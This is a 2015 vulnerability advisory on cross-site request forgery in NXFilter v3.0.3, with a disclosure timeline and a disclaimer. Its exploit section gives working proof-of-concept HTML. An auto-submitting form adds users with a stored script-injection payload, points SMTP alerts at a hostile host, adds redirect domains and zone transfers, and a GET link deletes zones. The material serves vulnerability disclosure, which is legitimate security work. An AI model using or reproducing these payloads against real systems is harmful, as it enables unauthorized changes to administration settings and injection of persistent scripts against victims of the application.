@@ -1,0 +1,152 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-NXFILTER-CSRF.txt
+
+
+Vendor:
+================================
+www.nxfilter.org/p2/
+
+
+Product:
+================================
+NXFilter v3.0.3
+
+
+Vulnerability Type:
+=================================
+Cross site request forgery - CSRF
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+No CSRF protections exist allowing us to make malicious HTTP requests on
+behalf of our victim.
+The Server will then happily process any of the following actions if our
+victim clicks our infected linx
+or visits our malicious website while currently logged in to the vulnerable
+application.
+
+1) "add arbitrary users"
+2) "add or change SMTP settings"
+3) "add arbitrary redirect domains"
+4) "add arbitrary zone transfers"
+5) "delete zone transfer domains"
+
+
+Exploit code(s):
+===============
+
+<!DOCTYPE>
+<html>
+<head>
+<title></title>
+
+<body onLoad="doit()">
+
+<script>
+function doit(){
+ var e=document.getElementById('HELL')
+ e.submit()
+}
+</script>
+
+
+
+1) CSRF add arbitrary users
+
+<form id="HELL" action="http://localhost/user,user.jsp" method="post">
+<input type="text" name="action_flag" value="insert" >
+<input type="text" name="name" value="punksnotdead">
+<input type="text" name="description" value="<script>alert(666)</script>">
+ <---- and some persistent XSS!
+</form>
+
+
+2) CSRF add or change SMTP notification alerts
+
+<form id="HELL" action="http://localhost/config,alert.jsp" method="post">
+<input type="text" name="action_flag" value="update" >
+<input type="text" name="admin_email" value="ghostofsin@abyss.com">
+<input type="text" name="smtp_host" value="6.6.6.0">
+<input type="text" name="smtp_port" value="25">
+<input type="text" name="smtp_user" value="hyp3rlinx">
+<input type="text" name="smtp_passwd" value="abc123">
+<input type="text" name="period" value="0">
+<input type="text" name="token" value="">
+</form>
+
+
+
+3) CSRF add arbitrary redirect domain
+
+<form id="HELL" action="http://localhost/config,redirection.jsp"
+method="post">
+<input type="text" name="action_flag" value="insert" >
+<input type="text" name="src" value="hyp3rlinx.altervista.org">
+<input type="text" name="dst" value="6.6.6.0">
+</form>
+
+
+
+4) CSRF add arbitrary zone transfers
+
+<form id="HELL" action="http://localhost/config,zone_transfer.jsp"
+method="post">
+<input type="text" name="action_flag" value="insert" >
+<input type="text" name="domain" value="hyp3rlinx.altervista.org">
+<input type="text" name="ip" value="6.6.6.0">
+</form>
+
+
+
+5) CSRF delete zone transfer domains
+
+http://localhost/config,zone_transfer.jsp?action_flag=delete&id=1
+
+
+Disclosure Timeline:
+======================================
+Vendor Notification: October 18, 2015
+November 5, 2015  : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Description:
+==========================================================
+
+Request Method(s):              [+] GET / POST
+
+
+Vulnerable Product:             [+] NXFilter v3.0.3
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
